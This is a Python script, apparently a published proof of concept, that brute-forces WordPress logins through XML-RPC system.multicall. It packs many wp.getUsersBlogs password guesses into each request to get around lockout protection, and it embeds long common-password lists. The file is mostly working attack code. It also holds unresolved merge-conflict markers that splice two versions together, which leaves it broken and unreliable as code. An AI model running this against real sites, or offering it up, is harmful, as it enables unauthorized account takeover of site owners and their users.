#!/usr/bin/python
<<<<<<< HEAD
# Wordpress XML-RPC Brute Force Amplification PoC by 1N3
# Last Updated: 20151018
# https://crowdshield.com
#
# ABOUT: This exploit launches a brute force amplification attack on target Wordpress sites. Since XMLRPC allows multiple auth calls per request, amplification is possible and standard brute force protection will not block the attack.
#
# USAGE: ./wp-xml-brute http://target.com/xmlrpc.php passwords.txt
#

=======
# Wordpress XML-RPC Brute Force PoC by 1N3
# Last Updated: 20151017
# https://crowdshield.com
#
# USAGE: ./wp-xml-brute http://target.com/xmlrpc.php
#
>>>>>>> 74b136739a6055924dfccb690b51d37d3efdc3a3

import urllib, urllib2, sys, getopt
from array import *

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def main(argv):
	argc = len(argv)

	if argc <= 1:

		print bcolors.OKBLUE + " __      __                        .___                                             " + bcolors.ENDC
		print bcolors.OKBLUE + "/  \    /  \   ____   _______    __| _/ ______   _______    ____     ______   ______" + bcolors.ENDC
		print bcolors.OKBLUE + "\   \/\/   /  /  _ \  \_  __ \  / __ |  \____ \  \_  __ \ _/ __ \   /  ___/  /  ___/" + bcolors.ENDC
		print bcolors.OKBLUE + " \        /  (  <_> )  |  | \/ / /_/ |  |  |_> >  |  | \/ \  ___/   \___ \   \___ \ " + bcolors.ENDC
		print bcolors.OKBLUE + "  \__/\  /    \____/   |__|    \____ |  |   __/   |__|     \___  > /____  > /____  >" + bcolors.ENDC
		print bcolors.OKBLUE + "       \/                           \/  |__|                   \/       \/       \/ " + bcolors.ENDC
		print bcolors.OKBLUE + "" + bcolors.ENDC
		print bcolors.OKBLUE + "		\ /       _  _  __    _  _    ___ __    __ _  _  __ __" + bcolors.ENDC
		print bcolors.OKBLUE + "		 X |V||  |_)|_)/     |_)|_)| | | |_    |_ / \|_)/  |_ " + bcolors.ENDC
		print bcolors.OKBLUE + '		/ \| ||__| \|  \__   |_)| \|_| | |__   |  \_/| \\\__|__' + bcolors.ENDC
		print bcolors.OKBLUE + "" + bcolors.ENDC
		print ""
<<<<<<< HEAD
		print bcolors.OKBLUE + "+ -- --=[XML-RPC Brute Force Script v20151018 by 1N3 @ https://crowdshield.com" + bcolors.ENDC
        	print bcolors.OKBLUE + "+ -- --=[usage: %s http://wordpress.org/xmlrpc.php passwords.txt" % (argv[0]) + bcolors.ENDC
        	sys.exit(0)

	url = argv[1] # SET TARGET
	wordlist = argv[2] # SET CUSTOM WORDLIST
	users = ['admin'] # USERS LIST, ADD MORE AS NEEDED OR CHANGE DEFAULT ADMIN
	
=======
		print bcolors.OKBLUE + "+ -- --=[XML-RPC Brute Force Script by 1N3 @ https://crowdshield.com" + bcolors.ENDC
        	print bcolors.OKBLUE + "+ -- --=[usage: %s http://wordpress.org/xmlrpc.php" % (argv[0]) + bcolors.ENDC
        	sys.exit(0)

	url = argv[1] # SET TARGET
	users = ['admin', 'wordpress', 'test', 'user', 'root', 'anonymous', 'guest',] # USERS LIST
	passwds = ['admin', 'test', '123456', 'password', '12345678', '1234', 'pussy', '12345', 'dragon', 'qwerty', '696969', 'mustang', 'letmein', 'baseball', 'master', 'michael', 'football', 'shadow', 'monkey', 'abc123', 'pass', 'fuckme', '6969', 'jordan', 'harley', 'ranger', 'iwantu', 'jennifer', 'hunter', 'fuck', '2000', 'test', 'batman', 'trustno1', 'thomas', 'tigger', 'robert', 'access', 'love', 'buster', '1234567', 'soccer', 'hockey', 'killer', 'george', 'sexy', 'andrew', 'charlie', 'superman', 'asshole', 'fuckyou', 'dallas', 'jessica', 'panties', 'pepper', '1111', 'austin', 'william', 'daniel', 'golfer', 'summer', 'heather', 'hammer', 'yankees', 'joshua', 'maggie', 'biteme', 'enter', 'ashley', 'thunder', 'cowboy', 'silver', 'richard', 'fucker', 'orange', 'merlin', 'michelle', 'corvette', 'bigdog', 'cheese', 'matthew', '121212', 'patrick', 'martin', 'freedom', 'ginger', 'blowjob', 'nicole', 'sparky', 'yellow', 'camaro', 'secret', 'dick', 'falcon', 'taylor', '111111', '131313', '123123', 'bitch', 'hello', 'scooter', 'please', 'porsche', 'guitar', 'chelsea', 'black', 'diamond', 'nascar', 'jackson', 'cameron', '654321', 'computer', 'amanda', 'wizard', 'xxxxxxxx', 'money', 'phoenix', 'mickey', 'bailey', 'knight', 'iceman', 'tigers', 'purple', 'andrea', 'horny', 'dakota', 'aaaaaa', 'player', 'sunshine', 'morgan', 'starwars', 'boomer', 'cowboys', 'edward', 'charles', 'girls', 'booboo', 'coffee', 'xxxxxx', 'bulldog', 'ncc1701', 'rabbit', 'peanut', 'john', 'johnny', 'gandalf', 'spanky', 'winter', 'brandy', 'compaq', 'carlos', 'tennis', 'james', 'mike', 'brandon', 'fender', 'anthony', 'blowme', 'ferrari', 'cookie', 'chicken', 'maverick', 'chicago', 'joseph', 'diablo', 'sexsex', 'hardcore', '666666', 'willie', 'welcome', 'chris', 'panther', 'yamaha', 'justin', 'banana', 'driver', 'marine', 'angels', 'fishing', 'david', 'maddog', 'hooters', 'wilson', 'butthead', 'dennis', 'fucking', 'captain', 'bigdick', 'chester', 'smokey', 'xavier', 'steven', 'viking', 'snoopy', 'blue', 'eagles', 'winner', 'samantha', 'house', 'miller', 'flower', 'jack', 'firebird', 'butter', 'united', 'turtle', 'steelers', 'tiffany', 'zxcvbn', 'tomcat', 'golf', 'bond007'] # PASS LIST
	passwds2 = ['princess', 'mercedes', '5150', 'doggie', 'zzzzzz', 'gunner', 'horney', 'bubba', '2112', 'fred', 'johnson', 'xxxxx', 'tits', 'member', 'boobs', 'donald', 'bigdaddy', 'bronco', 'penis', 'voyager', 'rangers', 'birdie', 'trouble', 'white', 'topgun', 'bigtits', 'bitches', 'green', 'super', 'qazwsx', 'magic', 'lakers', 'rachel', 'slayer', 'scott', '2222', 'asdf', 'video', 'london', '7777', 'marlboro', 'srinivas', 'internet', 'action', 'carter', 'jasper', 'monster', 'teresa', 'jeremy', '11111111', 'bill', 'crystal', 'peter', 'pussies', 'cock', 'beer', 'rocket', 'theman', 'oliver', 'prince', 'beach', 'amateur', '7777777', 'muffin', 'redsox', 'star', 'testing', 'shannon', 'murphy', 'frank', 'hannah', 'dave', 'eagle1', '11111', 'mother', 'nathan', 'raiders', 'steve', 'forever', 'angela', 'viper', 'ou812', 'jake', 'lovers', 'suckit', 'gregory', 'buddy', 'whatever', 'young', 'nicholas', 'lucky', 'helpme', 'jackie', 'monica', 'midnight', 'college', 'baby', 'cunt', 'brian', 'mark', 'startrek', 'sierra', 'leather', '232323', '4444', 'beavis', 'bigcock', 'happy', 'sophie', 'ladies', 'naughty', 'giants', 'booty', 'blonde', 'fucked', 'golden', '0', 'fire', 'sandra', 'pookie', 'packers', 'einstein', 'dolphins', '0', 'chevy', 'winston', 'warrior', 'sammy', 'slut', '8675309', 'zxcvbnm', 'nipples', 'power', 'victoria', 'asdfgh', 'vagina', 'toyota', 'travis', 'hotdog', 'paris', 'rock', 'xxxx', 'extreme', 'redskins', 'erotic', 'dirty', 'ford', 'freddy', 'arsenal', 'access14', 'wolf', 'nipple', 'iloveyou', 'alex', 'florida', 'eric', 'legend', 'movie', 'success', 'rosebud', 'jaguar', 'great', 'cool', 'cooper', '1313', 'scorpio', 'mountain', 'madison', '987654', 'brazil', 'lauren', 'japan', 'naked', 'squirt', 'stars', 'apple', 'alexis', 'aaaa', 'bonnie', 'peaches', 'jasmine', 'kevin', 'matt', 'qwertyui', 'danielle', 'beaver', '4321', '4128', 'runner', 'swimming', 'dolphin', 'gordon', 'casper', 'stupid', 'shit', 'saturn', 'gemini', 'apples', 'august', '3333', 'canada', 'blazer', 'cumming', 'hunting', 'kitty', 'rainbow', '112233', 'arthur', 'cream', 'calvin', 'shaved', 'surfer', 'samson', 'kelly', 'paul', 'mine', 'king', 'racing', '5555', 'eagle', 'hentai', 'newyork', 'little', 'redwings', 'smith', 'sticky', 'cocacola', 'animal', 'broncos', 'private', 'skippy', 'marvin', 'blondes', 'enjoy', 'girl', 'apollo', 'parker', 'qwert', 'time', 'sydney', 'women', 'voodoo', 'magnum', 'juice', 'abgrtyu'] # PASS LIST 2
	passwds3 = ['123456', 'password', '12345678', 'qwerty', 'abc123', '123456789', '111111', '1234567', 'iloveyou', 'adobe123', '123123', 'admin', '1234567890', 'letmein', 'photoshop', '1234', 'monkey', 'shadow', 'sunshine', '12345', 'password1', 'princess', 'azerty', 'trustno1', '000000', '1dc13d', 'admin', '123123', 'admin1', 'admins', '123456', '12345678', '7777777', 'letmein', '121212', 'qweqwe', 'iloveyou', 'administrator', 'holysh!t', '55555', '1q2w3e', 'qwerty', 'wordpress', 'wpsite', 'internet', 'asdfghjkl', '121314', 'lollipop', 'killer', 'pass', 'lovers', 'hello', 'dragon', 'admin123', 'office', 'jerome', 'fyfcnfcbz']

>>>>>>> 74b136739a6055924dfccb690b51d37d3efdc3a3
	print bcolors.OKBLUE + "" + bcolors.ENDC
	print bcolors.OKBLUE + " __      __                        .___                                             " + bcolors.ENDC
	print bcolors.OKBLUE + "/  \    /  \   ____   _______    __| _/ ______   _______    ____     ______   ______" + bcolors.ENDC
	print bcolors.OKBLUE + "\   \/\/   /  /  _ \  \_  __ \  / __ |  \____ \  \_  __ \ _/ __ \   /  ___/  /  ___/" + bcolors.ENDC
	print bcolors.OKBLUE + " \        /  (  <_> )  |  | \/ / /_/ |  |  |_> >  |  | \/ \  ___/   \___ \   \___ \ " + bcolors.ENDC
	print bcolors.OKBLUE + "  \__/\  /    \____/   |__|    \____ |  |   __/   |__|     \___  > /____  > /____  >" + bcolors.ENDC
	print bcolors.OKBLUE + "       \/                           \/  |__|                   \/       \/       \/ " + bcolors.ENDC
	print bcolors.OKBLUE + "" + bcolors.ENDC
	print bcolors.OKBLUE + "		\ /       _  _  __    _  _    ___ __    __ _  _  __ __" + bcolors.ENDC
	print bcolors.OKBLUE + "		 X |V||  |_)|_)/     |_)|_)| | | |_    |_ / \|_)/  |_ " + bcolors.ENDC
	print bcolors.OKBLUE + '		/ \| ||__| \|  \__   |_)| \|_| | |__   |  \_/| \\\__|__' + bcolors.ENDC
	print bcolors.OKBLUE + "" + bcolors.ENDC
	print ""
<<<<<<< HEAD
	print bcolors.OKBLUE + "+ -- --=[XML-RPC Brute Force Script v20151018 by 1N3 @ https://crowdshield.com" + bcolors.ENDC
	print bcolors.WARNING + "+ -- --=[Brute forcing target: " + url + "" + bcolors.ENDC

	data1 = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
	data2 = ""
	data3 = '</data></array></value></param></params></methodCall>'

	num_lines = sum(1 for line in open(wordlist))
	f = open(wordlist)
	lines = f.readlines()
	passwds = f.read().splitlines()
	f.close()

	num = 0 # CURRENT LINE POSITION
	count = 0 # HOW MANY AUTHS TO SEND PER REQUEST

	while num < num_lines:
		# SEND 50 AUTH REQUESTS PER REQUEST
		if count < 1000:
			num += 1
			count += 1

			# REACHED END OF FILE, SEND REQUEST AND ATTEMPT BRUTE FORCE...
			if num >= num_lines:
				data = "" + data1 + "" + data2 + "" + data3
=======
	print bcolors.OKBLUE + "+ -- --=[XML-RPC Brute Force Script by 1N3 @ https://crowdshield.com" + bcolors.ENDC
	print bcolors.WARNING + "+ -- --=[Brute forcing target: " + url + "" + bcolors.ENDC

	data1 = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
	#print data1
	data2 = ""

	for user in users:
		for passwd in passwds:
			data2 += str('<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>'+user+'</string></value><value><string>'+passwd+'</string></value></data></array></value></data></array></value></member></struct></value>')

	data3 = '</data></array></value></param></params></methodCall>'
	#print data3
	
	data = "" + data1 + "" + data2 + "" + data3
	#print data

	header = 'headers={"Content-Type": "application/xml"}'
	req = urllib2.Request(url, data, headers={'Content-Type': 'application/xml'})
	rsp = urllib2.urlopen(req)
	content = rsp.read()
	#print content

	if "admin" in content.lower():
		print bcolors.OKGREEN + "+ -- --=[Brute Force Amplification Attack Successful!" + bcolors.ENDC
		print bcolors.WARNING + "+ -- --=[Starting Brute Force Enumeration..." + bcolors.ENDC
		for user in users:
			for passwd in passwds:
				data = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>' + user + '</value></param><param><value>' + passwd + '</value></param></params></methodCall>'
>>>>>>> 74b136739a6055924dfccb690b51d37d3efdc3a3
				header = 'headers={"Content-Type": "application/xml"}'
				req = urllib2.Request(url, data, headers={'Content-Type': 'application/xml'})
				rsp = urllib2.urlopen(req)
				content = rsp.read()
				#print content

<<<<<<< HEAD
				if "admin" in content.lower():
					print bcolors.OKGREEN + "+ -- --=[Brute Force Amplification Attack Successful!" + bcolors.ENDC
					print bcolors.WARNING + "+ -- --=[Starting Brute Force Enumeration..." + bcolors.ENDC

					for user in users:
						while num <= num_lines:
							num -= 1
							passwd = str(lines[num])
							data = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>' + user + '</value></param><param><value>' + passwd + '</value></param></params></methodCall>'
							header = 'headers={"Content-Type": "application/xml"}'
							req = urllib2.Request(url, data, headers={'Content-Type': 'application/xml'})
							rsp = urllib2.urlopen(req)
							content = rsp.read()
							#print content

							if "incorrect" in content.lower():
								print bcolors.FAIL + "+ -- --=[Wrong username or password: " + user + "/" + passwd + "" + bcolors.ENDC
							elif "admin" in content.lower():
								print bcolors.OKGREEN + "+ -- --=[w00t! User found! Wordpress is pwned! " + user + "/" + passwd + "" + bcolors.ENDC
								sys.exit(0)
							else:
								print bcolors.WARNING + "+ -- --=[Invalid response from target" + bcolors.ENDC
								sys.exit(0)
				else:
					print bcolors.FAIL + "+ -- --=[Brute force failed" + bcolors.ENDC

				break
				sys.exit(0)
			else:
				passwd = str(lines[num])
				for user in users:
					data2 += str('<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>'+user+'</string></value><value><string>'+passwd+'</string></value></data></array></value></data></array></value></member></struct></value>')
		
		# WE'VE REACHED THE LIMIT, SEND THE REQUEST AND RESET COUNTER
		else:
			count = 0
			data = "" + data1 + "" + data2 + "" + data3
=======
				if "incorrect" in content.lower():
					print bcolors.FAIL + "+ -- --=[Wrong username or password: " + user + "/" + passwd + "" + bcolors.ENDC
				elif "admin" in content.lower():
					print bcolors.OKGREEN + "+ -- --=[w00t! User found! Wordpress is pwned! " + user + "/" + passwd + "" + bcolors.ENDC
					sys.exit(0)
				else:
					print bcolors.WARNING + "+ -- --=[Invalid response from target" + bcolors.ENDC
					sys.exit(0)
		sys.exit(0)
	else:
		print bcolors.FAIL + "+ -- --=[Brute force failed. Trying second wordlist..." + bcolors.ENDC
		data2 = ""
		for user in users:
			for passwd in passwds2:
				data2 += str('<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>'+user+'</string></value><value><string>'+passwd+'</string></value></data></array></value></data></array></value></member></struct></value>')

		data = "" + data1 + "" + data2 + "" + data3
		#print data

		header = 'headers={"Content-Type": "application/xml"}'
		req = urllib2.Request(url, data, headers={'Content-Type': 'application/xml'})
		rsp = urllib2.urlopen(req)
		content = rsp.read()
		#print content

		if "admin" in content.lower():
			print bcolors.OKGREEN + "+ -- --=[Brute Force Amplification Attack Successful!" + bcolors.ENDC
			print bcolors.WARNING + "+ -- --=[Starting Brute Force Enumeration..." + bcolors.ENDC
			for user in users:
				for passwd in passwds2:
					data = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>' + user + '</value></param><param><value>' + passwd + '</value></param></params></methodCall>'
					header = 'headers={"Content-Type": "application/xml"}'
					req = urllib2.Request(url, data, headers={'Content-Type': 'application/xml'})
					rsp = urllib2.urlopen(req)
					content = rsp.read()
					#print content

					if "incorrect" in content.lower():
						print bcolors.FAIL + "+ -- --=[Wrong username or password: " + user + "/" + passwd + "" + bcolors.ENDC
					elif "admin" in content.lower():
						print bcolors.OKGREEN + "+ -- --=[w00t! User found! Wordpress is pwned! " + user + "/" + passwd + "" + bcolors.ENDC
						sys.exit(0)
					else:
						print bcolors.WARNING + "+ -- --=[Invalid response from target" + bcolors.ENDC
						sys.exit(0)
			sys.exit(0)
		else:
			print bcolors.FAIL + "+ -- --=[Brute force failed. Trying third wordlist..." + bcolors.ENDC

			data2 = ""
			for user in users:
				for passwd in passwds3:
					data2 += str('<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>'+user+'</string></value><value><string>'+passwd+'</string></value></data></array></value></data></array></value></member></struct></value>')

			data = "" + data1 + "" + data2 + "" + data3
			#print data

>>>>>>> 74b136739a6055924dfccb690b51d37d3efdc3a3
			header = 'headers={"Content-Type": "application/xml"}'
			req = urllib2.Request(url, data, headers={'Content-Type': 'application/xml'})
			rsp = urllib2.urlopen(req)
			content = rsp.read()
			#print content
<<<<<<< HEAD
			data2 = ""
=======
>>>>>>> 74b136739a6055924dfccb690b51d37d3efdc3a3

			if "admin" in content.lower():
				print bcolors.OKGREEN + "+ -- --=[Brute Force Amplification Attack Successful!" + bcolors.ENDC
				print bcolors.WARNING + "+ -- --=[Starting Brute Force Enumeration..." + bcolors.ENDC
<<<<<<< HEAD

				for user in users:
					while num <= num_lines:
						passwd = str(lines[num])
=======
				for user in users:
					for passwd in passwds2:
>>>>>>> 74b136739a6055924dfccb690b51d37d3efdc3a3
						data = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>' + user + '</value></param><param><value>' + passwd + '</value></param></params></methodCall>'
						header = 'headers={"Content-Type": "application/xml"}'
						req = urllib2.Request(url, data, headers={'Content-Type': 'application/xml'})
						rsp = urllib2.urlopen(req)
						content = rsp.read()
<<<<<<< HEAD
						num -= 1
=======
>>>>>>> 74b136739a6055924dfccb690b51d37d3efdc3a3
						#print content

						if "incorrect" in content.lower():
							print bcolors.FAIL + "+ -- --=[Wrong username or password: " + user + "/" + passwd + "" + bcolors.ENDC
						elif "admin" in content.lower():
							print bcolors.OKGREEN + "+ -- --=[w00t! User found! Wordpress is pwned! " + user + "/" + passwd + "" + bcolors.ENDC
							sys.exit(0)
						else:
							print bcolors.WARNING + "+ -- --=[Invalid response from target" + bcolors.ENDC
							sys.exit(0)
<<<<<<< HEAD
			else:
				print bcolors.FAIL + "+ -- --=[Brute force failed" + bcolors.ENDC
=======
				sys.exit(0)
			else:
				print bcolors.FAIL + "+ -- --=[Brute force failed" + bcolors.ENDC
				sys.exit(0)

		sys.exit(0)
>>>>>>> 74b136739a6055924dfccb690b51d37d3efdc3a3

main(sys.argv)
